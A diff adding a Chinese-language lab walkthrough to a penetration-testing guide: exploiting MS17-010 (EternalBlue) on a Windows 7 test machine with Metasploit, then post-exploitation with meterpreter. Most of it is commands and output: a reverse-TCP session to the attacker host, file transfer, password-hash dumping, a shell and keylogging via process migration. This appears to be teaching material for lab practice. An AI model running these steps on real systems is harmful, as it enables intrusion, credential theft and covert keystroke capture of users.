@@ -420,6 +420,271 @@ exit
 meterpreter > exit
 ```
 
+### MS17-010[SMB]
+
+#### 漏洞描述
+
+Microsoft Windows SMB Server远程代码执行漏洞(Eternal blue永恒之蓝)
+
+Microsoft Server Message Block 1.0 (SMBv1)服务器处理某些请求时，在实现上存在远程代码执行漏洞，成功利用后可使 攻击者在目标服务器上执行任意代码。如果攻击失败，会导致 拒绝服务，对业务造成一定安全风险。
+受影响的系统：Microsoft Windows Server 2016、Microsoft Windows Server 2012 R2、Microsoft Windows Server 2012、 Microsoft Windows Server 2008 R2、Microsoft Windows Server 2008、Microsoft Windows RT 8.1等等。
+
+#### 实验环境
+
+kali(攻击机): `192.168.69.128`
+
+win7(靶机): `192.168.69.131`
+
+实验时关闭win7的防火墙便于复现漏洞。
+
+#### 使用`msfconsole`扫描渗透
+
+先对靶机进行扫描
+
+```sh
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 > use 3
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.69.131
+rhosts => 192.168.69.131
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[+] 192.168.69.131:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.69.131:445    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_ms17_010) > back
+```
+
+用`back`命令推出当前模块，然后选择攻击模块。
+
+```sh
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.69.131
+rhosts => 192.168.69.131
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         192.168.69.131   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
+                                             machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
+                                             ines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.69.128   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 192.168.69.128:4444 
+[*] 192.168.69.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.69.131:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.69.131:445    - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.69.131:445 - The target is vulnerable.
+[*] 192.168.69.131:445 - Connecting to target for exploitation.
+[+] 192.168.69.131:445 - Connection established for exploitation.
+[+] 192.168.69.131:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.69.131:445 - CORE raw buffer dump (40 bytes)
+[*] 192.168.69.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
+[*] 192.168.69.131:445 - 0x00000010  61 73 69 63 20 37 36 30 31 20 53 65 72 76 69 63  asic 7601 Servic
+[*] 192.168.69.131:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
+[+] 192.168.69.131:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.69.131:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.69.131:445 - Sending all but last fragment of exploit packet
+[*] 192.168.69.131:445 - Starting non-paged pool grooming
+[+] 192.168.69.131:445 - Sending SMBv2 buffers
+[+] 192.168.69.131:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.69.131:445 - Sending final SMBv2 buffers.
+[*] 192.168.69.131:445 - Sending last fragment of exploit packet!
+[*] 192.168.69.131:445 - Receiving response from exploit packet
+[+] 192.168.69.131:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.69.131:445 - Sending egg to corrupted connection.
+[*] 192.168.69.131:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201798 bytes) to 192.168.69.131
+[*] Meterpreter session 1 opened (192.168.69.128:4444 -> 192.168.69.131:49160) at 2024-12-31 00:48:19 -0500
+[+] 192.168.69.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.69.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.69.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter >
+```
+
+如上显示则成功渗透。
+
+#### 渗透后利用
+
+1. 屏幕截图
+```sh
+meterpreter > screenshot
+Screenshot saved to: /home/kali/SJPBNUap.jpeg
+```
+
+2. 上传文件
+```sh
+meterpreter > upload /home/kali/file.txt
+[*] Uploading  : /home/kali/file.txt -> file.txt
+[*] Uploaded 27.00 B of 27.00 B (100.0%): /home/kali/file.txt -> file.txt
+[*] Completed  : /home/kali/file.txt -> file.txt
+```
+
+![靶机中查看上传的文件](./penetration_testing_fig/file_upload.png)
+
+3. 下载文件
+```sh
+meterpreter > download drivers/etc/hosts
+[*] Downloading: drivers/etc/hosts -> /home/kali/hosts
+[*] Downloaded 824.00 B of 824.00 B (100.0%): drivers/etc/hosts -> /home/kali/hosts
+[*] Completed  : drivers/etc/hosts -> /home/kali/hosts
+```
+得到靶机的`hosts`文件。
+
+4. 获取口令哈希
+```sh
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+arwell:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+在[解密网站cmd5](cmd5.com)上解密有：
+
+![hash值1](./penetration_testing_fig/hash1.png)
+![hash值2](./penetration_testing_fig/hash2.png)
+
+5. shell
+```sh
+meterpreter > shell
+Process 1388 created.
+Channel 3 created.
+Microsoft Windows [�汾 6.1.7601]
+��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>exit
+exit
+```
+
+6. 监听键盘输入
+
+要想对用户`user`的键盘进行记录的话，需要把进程迁移到用户`user`的进程。
+在`SYSTEM`权限下时无法捕获`user`的键盘记录。
+
+::: info 流程
+`ps`找到用户进程 $\rightarrow$ `migrate PID`迁移进程 $\rightarrow$ `keyscan_start`开启监听 $\rightarrow$ `keyscan_dump`输出捕获记录 $\rightarrow$ `keyscan_stop`停止监听
+:::
+
+```sh
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System             x64   0
+ 224   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 240   452   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
+ 304   296   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 356   344   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 364   296   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 404   344   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 452   364   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 460   364   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 468   364   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 572   452   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
+ 640   452   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
+ 724   452   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
+ 732   452   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
+ 776   452   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
+ 808   452   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
+ 836   572   dllhost.exe
+ 872   1296  notepad.exe        x64   1        WIN-3GJGECVHTIC\arwell        C:\Windows\system32\NOTEPAD.EXE
+ 912   452   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 928   1296  cmd.exe            x64   1        WIN-3GJGECVHTIC\arwell        C:\Windows\system32\cmd.exe
+ 964   452   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1136  452   taskhost.exe       x64   1        WIN-3GJGECVHTIC\arwell        C:\Windows\system32\taskhost.exe
+ 1180  452   wmpnetwk.exe       x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1224  776   dwm.exe            x64   1        WIN-3GJGECVHTIC\arwell        C:\Windows\system32\Dwm.exe
+ 1296  1204  explorer.exe       x64   1        WIN-3GJGECVHTIC\arwell        C:\Windows\Explorer.EXE
+ 1376  452   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1464  452   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1660  356   conhost.exe        x64   1        WIN-3GJGECVHTIC\arwell        C:\Windows\system32\conhost.exe
+ 1772  452   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1776  452   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
+ 1952  452   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > migrate 872
+[*] Migrating from 912 to 872...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: WIN-3GJGECVHTIC\arwell
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+ni hao<CR>
+<Shift>wo shi at<^H>rwell<Shift>!
+
+meterpreter > keyscan_stop
+Stopping the keystroke sniffer...
+```
+
 ---
 
 ## 参考
